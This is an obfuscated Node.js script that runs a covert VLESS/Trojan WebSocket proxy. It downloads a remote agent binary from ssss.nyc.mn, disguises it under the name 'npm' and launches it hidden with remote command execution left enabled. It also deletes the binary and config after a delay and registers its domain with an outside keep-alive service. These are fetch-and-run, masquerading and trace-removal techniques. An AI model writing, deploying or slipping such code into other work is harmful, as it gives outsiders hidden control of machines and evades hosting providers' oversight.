const _0x56c975=_0x5100;function _0x5100(_0x388973,_0x2dd2c0){_0x388973=_0x388973-0x96;const _0xb8aa1=_0xb8aa();let _0x5100d8=_0xb8aa1[_0x388973];return _0x5100d8;}(function(_0x4dcfea,_0x59350c){const _0x4587d8=_0x5100,_0x29620f=_0x4dcfea();while(!![]){try{const _0x56ab7d=parseInt(_0x4587d8(0xb6))/0x1+-parseInt(_0x4587d8(0xd7))/0x2*(parseInt(_0x4587d8(0x10a))/0x3)+parseInt(_0x4587d8(0xee))/0x4+-parseInt(_0x4587d8(0xbb))/0x5*(-parseInt(_0x4587d8(0xbc))/0x6)+parseInt(_0x4587d8(0x97))/0x7*(parseInt(_0x4587d8(0x10e))/0x8)+parseInt(_0x4587d8(0xe7))/0x9*(parseInt(_0x4587d8(0x9d))/0xa)+-parseInt(_0x4587d8(0xbe))/0xb;if(_0x56ab7d===_0x59350c)break;else _0x29620f['push'](_0x29620f['shift']());}catch(_0xb2cc65){_0x29620f['push'](_0x29620f['shift']());}}}(_0xb8aa,0x89a96));const os=require('os'),http=require(_0x56c975(0xa2)),fs=require('fs'),axios=require('axios'),net=require(_0x56c975(0xa0)),path=require(_0x56c975(0x111)),crypto=require('crypto'),{Buffer}=require(_0x56c975(0x102)),{exec,execSync}=require(_0x56c975(0xf6)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x56c975(0x9f)][_0x56c975(0xd3)]||_0x56c975(0xed),NEZHA_SERVER=process[_0x56c975(0x9f)][_0x56c975(0xc3)]||'',NEZHA_PORT=process[_0x56c975(0x9f)][_0x56c975(0x100)]||'',NEZHA_KEY=process[_0x56c975(0x9f)][_0x56c975(0xf0)]||'',DOMAIN=process['env'][_0x56c975(0xe3)]||_0x56c975(0x109),AUTO_ACCESS=process[_0x56c975(0x9f)]['AUTO_ACCESS']||!![],WSPATH=process[_0x56c975(0x9f)][_0x56c975(0xce)]||UUID[_0x56c975(0xc9)](0x0,0x8),SUB_PATH=process[_0x56c975(0x9f)][_0x56c975(0xba)]||_0x56c975(0xe5),NAME=process[_0x56c975(0x9f)]['NAME']||'',PORT=process[_0x56c975(0x9f)][_0x56c975(0xb0)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5b8808=_0x56c975;try{const _0x57e1cb=await axios[_0x5b8808(0xaf)](_0x5b8808(0x9b)),_0x4a9dbf=_0x57e1cb[_0x5b8808(0xde)];ISP=(_0x4a9dbf['country_code']+'-'+_0x4a9dbf[_0x5b8808(0xfa)])[_0x5b8808(0xac)](/ /g,'_');}catch(_0x32df77){ISP=_0x5b8808(0xd2);}};GetISP();const httpServer=http[_0x56c975(0xea)]((_0x42d8ce,_0x3ee0d9)=>{const _0x148132=_0x56c975;if(_0x42d8ce[_0x148132(0xab)]==='/'){const _0x23a7a7=path['join'](__dirname,'index.html');fs[_0x148132(0xca)](_0x23a7a7,_0x148132(0xe8),(_0x3647ff,_0x17ca87)=>{const _0x28dc42=_0x148132;if(_0x3647ff){_0x3ee0d9[_0x28dc42(0xc7)](0xc8,{'Content-Type':_0x28dc42(0xf9)}),_0x3ee0d9[_0x28dc42(0xe0)](_0x28dc42(0xb9));return;}_0x3ee0d9[_0x28dc42(0xc7)](0xc8,{'Content-Type':_0x28dc42(0xf9)}),_0x3ee0d9[_0x28dc42(0xe0)](_0x17ca87);});return;}else{if(_0x42d8ce[_0x148132(0xab)]==='/'+SUB_PATH){const _0x6b4e23=NAME?NAME+'-'+ISP:ISP,_0x591589=_0x148132(0x107)+UUID+'@'+DOMAIN+_0x148132(0xaa)+DOMAIN+_0x148132(0xf7)+DOMAIN+_0x148132(0xa3)+WSPATH+'#'+_0x6b4e23,_0xd15b1b=_0x148132(0xcd)+UUID+'@'+DOMAIN+_0x148132(0x110)+DOMAIN+_0x148132(0xf7)+DOMAIN+_0x148132(0xa3)+WSPATH+'#'+_0x6b4e23,_0x5ab68c=_0x591589+'\x0a'+_0xd15b1b,_0x5c4ef6=Buffer[_0x148132(0xb5)](_0x5ab68c)['toString'](_0x148132(0x101));_0x3ee0d9[_0x148132(0xc7)](0xc8,{'Content-Type':_0x148132(0xfe)}),_0x3ee0d9[_0x148132(0xe0)](_0x5c4ef6+'\x0a');}else _0x3ee0d9[_0x148132(0xc7)](0x194,{'Content-Type':_0x148132(0xfe)}),_0x3ee0d9[_0x148132(0xe0)](_0x148132(0x10c));}}),wss=new WebSocket[(_0x56c975(0xa5))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x56c975(0xd9)];function resolveHost(_0x333a0c){return new Promise((_0x546996,_0xfd88ca)=>{const _0x2594e5=_0x5100;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2594e5(0xc6)](_0x333a0c)){_0x546996(_0x333a0c);return;}let _0x1e766f=0x0;function _0x76dcfb(){const _0x4fc24d=_0x2594e5;if(_0x1e766f>=DNS_SERVERS[_0x4fc24d(0xa6)]){_0xfd88ca(new Error(_0x4fc24d(0xa4)+_0x333a0c+_0x4fc24d(0xe1)));return;}const _0x33bbe9=DNS_SERVERS[_0x1e766f];_0x1e766f++;const _0x5d8a67='https://dns.google/resolve?name='+encodeURIComponent(_0x333a0c)+_0x4fc24d(0x96);axios['get'](_0x5d8a67,{'timeout':0x1388,'headers':{'Accept':_0x4fc24d(0x9e)}})[_0x4fc24d(0xf1)](_0x13048e=>{const _0x41e4c2=_0x4fc24d,_0x443c79=_0x13048e[_0x41e4c2(0xde)];if(_0x443c79[_0x41e4c2(0x99)]===0x0&&_0x443c79[_0x41e4c2(0xf8)]&&_0x443c79[_0x41e4c2(0xf8)][_0x41e4c2(0xa6)]>0x0){const _0xe71920=_0x443c79[_0x41e4c2(0xf8)]['find'](_0x3d3261=>_0x3d3261['type']===0x1);if(_0xe71920){_0x546996(_0xe71920[_0x41e4c2(0xde)]);return;}}_0x76dcfb();})[_0x4fc24d(0x104)](_0x3cdf5c=>{_0x76dcfb();});}_0x76dcfb();});}function _0xb8aa(){const _0x23f5ae=['npm\x20is\x20already\x20running,\x20skip\x20running...','from','909848oTeLdr','once','443','Hello\x20world!','SUB_PATH','5DZfGpU','2731566XTAQyA','write','22765347SDLWnk','error','readUInt16BE','utf-8','split','NEZHA_SERVER','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','log','test','writeHead','Server\x20is\x20running\x20on\x20port\x20','slice','readFile','2087','arm','trojan://','WSPATH','connect','error:\x20','2096','Unknown','UUID','npm\x20download\x20successfully','connection','toString','783098WnFxBn','2053','1.1.1.1','createWriteStream','config.yaml','https://oooo.serv00.net/add-url','createHash','data','send','end','\x20with\x20all\x20DNS\x20servers','hex','DOMAIN','message','sub','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2157957mahJdA','utf8','https://arm64.ssss.nyc.mn/agent','createServer','listen','2083','5efabea4-f6d4-91fd-b8f0-17e004c89c60','3436344gyynqU','false','NEZHA_KEY','then','https://arm64.ssss.nyc.mn/v1','decode','8443','arch','child_process','&fp=chrome&type=ws&host=','Answer','text/html','isp','reduce','close','true','text/plain','map','NEZHA_PORT','base64','buffer','npm\x20running\x20error:','catch','https://amd64.ssss.nyc.mn/agent','https://amd64.ssss.nyc.mn/v1','vless://','\x20-p\x20','1234.abc.com','3cjQxLy','https://','Not\x20Found\x0a','pop','325896AGZNeE','writeFileSync',':443?security=tls&sni=','path','&type=A','14mVoBrC','finish','Status','includes','https://api.ip.sb/geoip','join','30YBAloR','application/dns-json','env','net','update','http','&path=%2F','Failed\x20to\x20resolve\x20','Server','length','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','substr','/bin/bash',':443?encryption=none&security=tls&sni=','url','replace','concat','readUInt8','get','PORT','chmod\x20+x\x20npm','pipe','npm'];_0xb8aa=function(){return _0x23f5ae;};return _0xb8aa();}function handleVlessConnection(_0x1f55a0,_0x25aef5){const _0x1802eb=_0x56c975,[_0x462a98]=_0x25aef5,_0x35fae4=_0x25aef5[_0x1802eb(0xc9)](0x1,0x11);if(!_0x35fae4['every']((_0x2988e8,_0x473f2a)=>_0x2988e8==parseInt(uuid[_0x1802eb(0xa8)](_0x473f2a*0x2,0x2),0x10)))return![];let _0x18dda8=_0x25aef5[_0x1802eb(0xc9)](0x11,0x12)[_0x1802eb(0xae)]()+0x13;const _0x3aede8=_0x25aef5['slice'](_0x18dda8,_0x18dda8+=0x2)[_0x1802eb(0xc0)](0x0),_0x4f5f05=_0x25aef5['slice'](_0x18dda8,_0x18dda8+=0x1)[_0x1802eb(0xae)](),_0x235e1b=_0x4f5f05==0x1?_0x25aef5[_0x1802eb(0xc9)](_0x18dda8,_0x18dda8+=0x4)[_0x1802eb(0x9c)]('.'):_0x4f5f05==0x2?new TextDecoder()[_0x1802eb(0xf3)](_0x25aef5[_0x1802eb(0xc9)](_0x18dda8+0x1,_0x18dda8+=0x1+_0x25aef5[_0x1802eb(0xc9)](_0x18dda8,_0x18dda8+0x1)[_0x1802eb(0xae)]())):_0x4f5f05==0x3?_0x25aef5['slice'](_0x18dda8,_0x18dda8+=0x10)[_0x1802eb(0xfb)]((_0xdb4f1b,_0x3936ea,_0x518347,_0x5b2217)=>_0x518347%0x2?_0xdb4f1b['concat'](_0x5b2217[_0x1802eb(0xc9)](_0x518347-0x1,_0x518347+0x1)):_0xdb4f1b,[])[_0x1802eb(0xff)](_0x25596f=>_0x25596f[_0x1802eb(0xc0)](0x0)[_0x1802eb(0xd6)](0x10))['join'](':'):'';_0x1f55a0[_0x1802eb(0xdf)](new Uint8Array([_0x462a98,0x0]));const _0x461038=createWebSocketStream(_0x1f55a0);return resolveHost(_0x235e1b)[_0x1802eb(0xf1)](_0x425efd=>{const _0x141dce=_0x1802eb;net[_0x141dce(0xcf)]({'host':_0x425efd,'port':_0x3aede8},function(){const _0x450f39=_0x141dce;this['write'](_0x25aef5[_0x450f39(0xc9)](_0x18dda8)),_0x461038['on'](_0x450f39(0xbf),()=>{})[_0x450f39(0xb2)](this)['on'](_0x450f39(0xbf),()=>{})[_0x450f39(0xb2)](_0x461038);})['on'](_0x141dce(0xbf),()=>{});})['catch'](_0x35a702=>{const _0x320591=_0x1802eb;net[_0x320591(0xcf)]({'host':_0x235e1b,'port':_0x3aede8},function(){const _0x25a00e=_0x320591;this[_0x25a00e(0xbd)](_0x25aef5[_0x25a00e(0xc9)](_0x18dda8)),_0x461038['on'](_0x25a00e(0xbf),()=>{})[_0x25a00e(0xb2)](this)['on'](_0x25a00e(0xbf),()=>{})[_0x25a00e(0xb2)](_0x461038);})['on'](_0x320591(0xbf),()=>{});}),!![];}function handleTrojanConnection(_0x44d7f7,_0x2eb43c){const _0x3e38eb=_0x56c975;try{if(_0x2eb43c[_0x3e38eb(0xa6)]<0x3a)return![];const _0x32f07d=_0x2eb43c[_0x3e38eb(0xc9)](0x0,0x38)['toString'](),_0x10b3b4=[UUID];let _0x53292f=null;for(const _0x7e44f1 of _0x10b3b4){const _0x391f10=crypto[_0x3e38eb(0xdd)]('sha224')[_0x3e38eb(0xa1)](_0x7e44f1)['digest'](_0x3e38eb(0xe2));if(_0x391f10===_0x32f07d){_0x53292f=_0x7e44f1;break;}}if(!_0x53292f)return![];let _0x5e419a=0x38;_0x2eb43c[_0x5e419a]===0xd&&_0x2eb43c[_0x5e419a+0x1]===0xa&&(_0x5e419a+=0x2);const _0x2a670a=_0x2eb43c[_0x5e419a];if(_0x2a670a!==0x1)return![];_0x5e419a+=0x1;const _0xf7d43d=_0x2eb43c[_0x5e419a];_0x5e419a+=0x1;let _0x560c4b,_0x1200b9;if(_0xf7d43d===0x1)_0x560c4b=_0x2eb43c['slice'](_0x5e419a,_0x5e419a+0x4)[_0x3e38eb(0x9c)]('.'),_0x5e419a+=0x4;else{if(_0xf7d43d===0x3){const _0x3333f1=_0x2eb43c[_0x5e419a];_0x5e419a+=0x1,_0x560c4b=_0x2eb43c['slice'](_0x5e419a,_0x5e419a+_0x3333f1)[_0x3e38eb(0xd6)](),_0x5e419a+=_0x3333f1;}else{if(_0xf7d43d===0x4)_0x560c4b=_0x2eb43c['slice'](_0x5e419a,_0x5e419a+0x10)[_0x3e38eb(0xfb)]((_0xd31647,_0x31cd9b,_0x43ffbb,_0x40c922)=>_0x43ffbb%0x2?_0xd31647[_0x3e38eb(0xad)](_0x40c922[_0x3e38eb(0xc9)](_0x43ffbb-0x1,_0x43ffbb+0x1)):_0xd31647,[])[_0x3e38eb(0xff)](_0x309fe1=>_0x309fe1[_0x3e38eb(0xc0)](0x0)[_0x3e38eb(0xd6)](0x10))['join'](':'),_0x5e419a+=0x10;else return![];}}_0x1200b9=_0x2eb43c[_0x3e38eb(0xc0)](_0x5e419a),_0x5e419a+=0x2;_0x5e419a<_0x2eb43c['length']&&_0x2eb43c[_0x5e419a]===0xd&&_0x2eb43c[_0x5e419a+0x1]===0xa&&(_0x5e419a+=0x2);const _0x12212a=createWebSocketStream(_0x44d7f7);return resolveHost(_0x560c4b)[_0x3e38eb(0xf1)](_0x569bff=>{const _0x2efa7f=_0x3e38eb;net[_0x2efa7f(0xcf)]({'host':_0x569bff,'port':_0x1200b9},function(){const _0x1de0fa=_0x2efa7f;_0x5e419a<_0x2eb43c[_0x1de0fa(0xa6)]&&this[_0x1de0fa(0xbd)](_0x2eb43c[_0x1de0fa(0xc9)](_0x5e419a)),_0x12212a['on'](_0x1de0fa(0xbf),()=>{})[_0x1de0fa(0xb2)](this)['on']('error',()=>{})['pipe'](_0x12212a);})['on'](_0x2efa7f(0xbf),()=>{});})[_0x3e38eb(0x104)](_0x309fcd=>{const _0x448e60=_0x3e38eb;net['connect']({'host':_0x560c4b,'port':_0x1200b9},function(){const _0x453dab=_0x5100;_0x5e419a<_0x2eb43c[_0x453dab(0xa6)]&&this['write'](_0x2eb43c[_0x453dab(0xc9)](_0x5e419a)),_0x12212a['on'](_0x453dab(0xbf),()=>{})['pipe'](this)['on'](_0x453dab(0xbf),()=>{})[_0x453dab(0xb2)](_0x12212a);})['on'](_0x448e60(0xbf),()=>{});}),!![];}catch(_0x2de04b){return![];}}wss['on'](_0x56c975(0xd5),(_0x43cdbf,_0x17c488)=>{const _0x38b334=_0x56c975,_0x2bd54b=_0x17c488[_0x38b334(0xab)]||'';_0x43cdbf[_0x38b334(0xb7)](_0x38b334(0xe4),_0x5d4112=>{const _0x2c58fd=_0x38b334;if(_0x5d4112[_0x2c58fd(0xa6)]>0x11&&_0x5d4112[0x0]===0x0){const _0x428404=_0x5d4112[_0x2c58fd(0xc9)](0x1,0x11),_0x353bb8=_0x428404['every']((_0x3f1c27,_0x3da267)=>_0x3f1c27==parseInt(uuid['substr'](_0x3da267*0x2,0x2),0x10));if(_0x353bb8){!handleVlessConnection(_0x43cdbf,_0x5d4112)&&_0x43cdbf[_0x2c58fd(0xfc)]();return;}}!handleTrojanConnection(_0x43cdbf,_0x5d4112)&&_0x43cdbf['close']();})['on'](_0x38b334(0xbf),()=>{});});const getDownloadUrl=()=>{const _0x4e0f54=_0x56c975,_0x3ae579=os[_0x4e0f54(0xf5)]();return _0x3ae579===_0x4e0f54(0xcc)||_0x3ae579==='arm64'||_0x3ae579==='aarch64'?!NEZHA_PORT?_0x4e0f54(0xf2):_0x4e0f54(0xe9):!NEZHA_PORT?_0x4e0f54(0x106):_0x4e0f54(0x105);},downloadFile=async()=>{const _0x2a080e=_0x56c975;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3c24a4=getDownloadUrl(),_0x2617f7=await axios({'method':_0x2a080e(0xaf),'url':_0x3c24a4,'responseType':'stream'}),_0x6404b7=fs[_0x2a080e(0xda)]('npm');return _0x2617f7[_0x2a080e(0xde)][_0x2a080e(0xb2)](_0x6404b7),new Promise((_0x12b868,_0x40ce26)=>{const _0x413aa3=_0x2a080e;_0x6404b7['on'](_0x413aa3(0x98),()=>{const _0x34b8c2=_0x413aa3;console[_0x34b8c2(0xc5)](_0x34b8c2(0xd4)),exec(_0x34b8c2(0xb1),_0x2e6e12=>{if(_0x2e6e12)_0x40ce26(_0x2e6e12);_0x12b868();});}),_0x6404b7['on'](_0x413aa3(0xbf),_0x40ce26);});}catch(_0x2f78d5){throw _0x2f78d5;}},runnz=async()=>{const _0x5acf0e=_0x56c975;try{const _0x2d8b57=execSync(_0x5acf0e(0xe6),{'encoding':_0x5acf0e(0xc1)});if(_0x2d8b57['trim']()!==''){console['log'](_0x5acf0e(0xb4));return;}}catch(_0x399f38){}await downloadFile();let _0x2ded04='',_0x39140b=[_0x5acf0e(0xb8),_0x5acf0e(0xf4),_0x5acf0e(0xd1),_0x5acf0e(0xcb),_0x5acf0e(0xec),_0x5acf0e(0xd8)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5c1c7b=_0x39140b[_0x5acf0e(0x9a)](NEZHA_PORT)?'--tls':'';_0x2ded04='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5acf0e(0x108)+NEZHA_KEY+'\x20'+_0x5c1c7b+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4b23ae=NEZHA_SERVER[_0x5acf0e(0x9a)](':')?NEZHA_SERVER[_0x5acf0e(0xc2)](':')[_0x5acf0e(0x10d)]():'',_0x198ce0=_0x39140b['includes'](_0x4b23ae)?_0x5acf0e(0xfd):_0x5acf0e(0xef),_0x1715f8='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x5acf0e(0xa7)+_0x198ce0+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5acf0e(0x10f)](_0x5acf0e(0xdb),_0x1715f8);}_0x2ded04=_0x5acf0e(0xc4);}else{console[_0x5acf0e(0xc5)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x2ded04,{'shell':_0x5acf0e(0xa9)},_0x46a671=>{const _0x1cbcd6=_0x5acf0e;if(_0x46a671)console[_0x1cbcd6(0xbf)](_0x1cbcd6(0x103),_0x46a671);else console[_0x1cbcd6(0xc5)]('npm\x20is\x20running');});}catch(_0x370102){console[_0x5acf0e(0xbf)](_0x5acf0e(0xd0)+_0x370102);}};async function addAccessTask(){const _0x40531a=_0x56c975;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3b1c39=_0x40531a(0x10b)+DOMAIN;try{const _0x31ccce=await axios['post'](_0x40531a(0xdc),{'url':_0x3b1c39},{'headers':{'Content-Type':'application/json'}});console[_0x40531a(0xc5)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x25dd26){}}const delFiles=()=>{const _0x33adec=_0x56c975;fs['unlink'](_0x33adec(0xb3),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer[_0x56c975(0xeb)](PORT,()=>{const _0x511942=_0x56c975;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x511942(0xc5)](_0x511942(0xc8)+PORT);});
